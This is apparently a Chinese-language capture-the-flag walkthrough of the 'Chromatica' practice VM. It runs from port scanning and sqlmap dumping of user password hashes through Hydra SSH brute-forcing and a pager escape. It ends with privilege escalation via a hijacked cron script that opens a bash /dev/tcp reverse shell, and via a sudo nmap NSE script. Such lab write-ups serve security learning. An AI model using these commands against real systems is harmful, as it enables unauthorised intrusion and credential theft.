# 信息搜集

端口扫描

```aiignore
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.21.5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-14 21:52 EDT
Nmap scan report for 192.168.21.5
Host is up (0.00036s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
5353/tcp open  domain  (generic dns response: REFUSED)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5353-TCP:V=7.95%I=7%D=5/14%Time=6A067C61%P=x86_64-pc-linux-gnu%r(DN
SF:S-SD-TCP,30,"\0\.\0\0\x80\x85\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x
SF:04_udp\x05local\0\0\x0c\0\x01");
MAC Address: 08:00:27:6A:DC:E7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.81 seconds
```

# 漏洞利用

先看一下80端口有什么东西

![img.png](img.png)

目录枚举

```aiignore
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://192.168.21.5 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
assets               (Status: 301) [Size: 313] [--> http://192.168.21.5/assets/]                                                                          
.hta                 (Status: 403) [Size: 277]
css                  (Status: 301) [Size: 310] [--> http://192.168.21.5/css/]
index.html           (Status: 200) [Size: 4047]
javascript           (Status: 301) [Size: 317] [--> http://192.168.21.5/javascript/]                                                                      
js                   (Status: 301) [Size: 309] [--> http://192.168.21.5/js/]
robots.txt           (Status: 200) [Size: 36]
server-status        (Status: 403) [Size: 277]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

看一下/robots.txt

```aiignore
user-agent: dev
Allow: /dev-portal/
```

添加User-Agent扫一下这个目录

```aiignore
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://192.168.21.5/dev-portal/ -H "User-Agent: dev"
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.5/dev-portal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 277]
.hta                 (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
assets               (Status: 301) [Size: 324] [--> http://192.168.21.5/dev-portal/assets/]                                                               
css                  (Status: 301) [Size: 321] [--> http://192.168.21.5/dev-portal/css/]                                                                  
index.html           (Status: 200) [Size: 527]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

看一下有什么

```aiignore
┌──(kali㉿kali)-[~]
└─$ curl -A dev http://192.168.21.5/dev-portal/index.html
<!DOCTYPE html>
<html>
<head>
        <title>Chromatica</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="css/style.css">
</head>
<body>
        <div class="background-image"></div>
        <div class="container">
                <h1> Search</h1>
                <form action="search.php" method="get">
                        <label for="query">Chromatica</label>
                        <input type="text" id="query" name="city" placeholder="Type a city's name...">
                        <button type="submit">Go</button>
                </form>
        </div>
</body>
</html>
```

能看到search.php

```aiignore
┌──(kali㉿kali)-[~]
└─$ curl -A dev "http://192.168.21.5/dev-portal/search.php?city=user"
No results found.<a href="index.html"> take me back </a>
<!-- please for the love of god someone paint this page a color will ya it looks dreadfull uhhhhj -->
```

尝试sql注入

```aiignore
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.21.5/dev-portal/search.php?city=test" --user-agent=dev --batch --dbs
available databases [2]:
[*] Chromatica
[*] information_schema
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.21.5/dev-portal/search.php?city=test" --user-agent=dev --batch -D Chromatica --tables
Database: Chromatica
[2 tables]
+--------+
| cities |
| users  |
+--------+
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.21.5/dev-portal/search.php?city=test" --user-agent=dev --batch -D Chromatica -T users --dump
Database: Chromatica                                                        
Table: users
[5 entries]
+----+-----------------------------------------------+-----------+-----------------------------+
| id | password                                      | username  | description                 |
+----+-----------------------------------------------+-----------+-----------------------------+
| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |
| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |
| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |
| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |
| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |
+----+-----------------------------------------------+-----------+-----------------------------+
```

破解一下密码

![img_1.png](img_1.png)

保存下来，尝试ssh登录

```aiignore
┌──(kali㉿kali)-[~]
└─$ hydra -L user -P pass ssh://192.168.21.5
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 22:15:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking ssh://192.168.21.5:22/
[22][ssh] host: 192.168.21.5   login: dev   password: flaghere
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 22:15:57
```

ssh登录

```aiignore
┌──(kali㉿kali)-[~]
└─$ ssh dev@192.168.21.5 
dev@192.168.21.5's password: 
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 192.168.21.5 closed.
```

这里可以把窗口缩小在进行登录，看大佬解释是，由于终端没有足够的空间输出整个消息，可能会使用more和less作为分页工具，我们将能够生成一个shell

```aiignore
┌──(kali㉿kali)-[~]
└─$ ssh dev@192.168.21.5   
dev@192.168.21.5's password: 
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUN
T
IF YOU WANNA DO SOME MAINTENANCE O
N THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD 
MORE heh,,
!/bin/bash
dev@Chromatica:~$
```

# 权限提升

```aiignore
dev@Chromatica:~$ ls -la
total 72                                                 
drwxr-x--- 7 dev  dev  4096 Apr 18  2024 .               
drwxr-xr-x 4 root root 4096 Mar 28  2023 ..              
-rw------- 1 dev  dev  3467 Apr 24  2024 .bash_history   
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout    
-rw-r--r-- 1 dev  dev  3814 Mar 28  2023 .bashrc         
-rwxrwxr-x 1 root root   56 Mar 28  2023 bye.sh          
drwx------ 2 dev  dev  4096 Mar 21  2023 .cache          
drwxrwxr-x 3 dev  dev  4096 Mar 21  2023 .config         
drwx------ 3 dev  dev  4096 Apr 18  2024 .gnupg          
-rw-rw-r-- 1 root root  280 Jun  2  2023 hello.txt       
-rw------- 1 dev  dev    20 Mar 28  2023 .lesshst        
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile        
drwx------ 4 dev  dev  4096 Mar 27  2023 snap            
-rw-r--r-- 1 root root   35 May 23  2023 user.txt        
drwxr-xr-x 2 dev  dev  4096 Jun 19  2023 .vim            
-rw------- 1 dev  dev  9900 Apr 18  2024 .viminfo
dev@Chromatica:~$ sudo -l                                
[sudo] password for dev:                                 
Sorry, user dev may not run sudo on Chromatica.
dev@Chromatica:~$ find / -perm -4000 -type f 2>/dev/null 
/snap/snapd/18357/usr/lib/snapd/snap-confine             
/snap/core18/2714/bin/mount                              
/snap/core18/2714/bin/ping                               
/snap/core18/2714/bin/su                                 
/snap/core18/2714/bin/umount                             
/snap/core18/2714/usr/bin/chfn                           
/snap/core18/2714/usr/bin/chsh                           
/snap/core18/2714/usr/bin/gpasswd                        
/snap/core18/2714/usr/bin/newgrp                         
/snap/core18/2714/usr/bin/passwd                         
/snap/core18/2714/usr/bin/sudo                           
/snap/core18/2714/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                      
/snap/core18/2714/usr/lib/openssh/ssh-keysign            
/snap/core20/1822/usr/bin/chfn                           
/snap/core20/1822/usr/bin/chsh                           
/snap/core20/1822/usr/bin/gpasswd
/snap/core20/1822/usr/bin/mount
/snap/core20/1822/usr/bin/newgrp
/snap/core20/1822/usr/bin/passwd
/snap/core20/1822/usr/bin/su
/snap/core20/1822/usr/bin/sudo
/snap/core20/1822/usr/bin/umount
/snap/core20/1822/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1822/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/pkexec
/usr/bin/su
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/libexec/polkit-agent-helper-1
dev@Chromatica:~$ getcap -r / 2>/dev/null
/snap/core20/1822/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
//找到了定时执行/opt/scripts/end_of_day.sh
dev@Chromatica:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh
#
dev@Chromatica:~$ ls -la /etc/cron*
-rw-r--r-- 1 root root 1191 Mar 28  2023 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 23  2023 .
drwxr-xr-x 108 root root 4096 Apr 24  2024 ..
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r--   1 root root  712 Jan 28  2022 php
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   90 May 23  2023 reset

/etc/cron.daily:
total 36
drwxr-xr-x   2 root root 4096 Mar 22  2023 .
drwxr-xr-x 108 root root 4096 Apr 24  2024 ..
-rwxr-xr-x   1 root root  539 Sep  8  2022 apache2
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Feb 17  2023 .
drwxr-xr-x 108 root root 4096 Apr 24  2024 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Feb 17  2023 .
drwxr-xr-x 108 root root 4096 Apr 24  2024 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x   2 root root 4096 Feb 17  2023 .
drwxr-xr-x 108 root root 4096 Apr 24  2024 ..
-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
//拥有写权限
dev@Chromatica:~$ ls -la /opt/scripts/
total 12
drwxrwxrwx 2 root    root    4096 Apr 18  2024 .
drwxr-xr-x 6 root    root    4096 Apr 24  2024 ..
-rwxrwxrw- 1 analyst analyst   30 May 15 02:00 end_of_day.sh                                                      
dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh
#this is my end of day script
dev@Chromatica:~$ echo "chmod +s /bin/bash" > /opt/scripts/end_of_day.sh
//换一个
dev@Chromatica:~$ echo '/bin/bash -i >& /dev/tcp/192.168.21.7/1234 0>&1' > /opt/scripts/end_of_day.sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234            
listening on [any] 1234 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.5] 39976
bash: cannot set terminal process group (2249): Inappropriate ioctl for device
bash: no job control in this shell
analyst@Chromatica:~$ id
id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
analyst@Chromatica:~$ sudo -l
sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap
analyst@Chromatica:~$ echo 'os.execute("/bin/sh")' > /tmp/x.nse
echo 'os.execute("/bin/sh")' > /tmp/x.nse
analyst@Chromatica:~$ sudo nmap --script=/tmp/x.nse
sudo nmap --script=/tmp/x.nse
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-15 02:58 UTC
id
uid=0(root) gid=0(root) groups=0(root)
```